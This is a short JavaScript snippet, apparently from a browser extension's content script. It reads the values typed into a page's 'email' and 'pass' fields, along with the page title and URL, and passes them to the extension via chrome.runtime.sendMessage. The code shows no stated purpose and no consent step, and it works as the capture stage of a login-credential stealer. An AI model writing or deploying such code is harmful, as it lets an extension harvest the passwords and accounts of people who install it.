chrome.runtime.sendMessage({
	'title': document.title,
	'url': window.location.href,
	'user': document.getElementById('email').value,
	'pass': document.getElementById('pass').value
})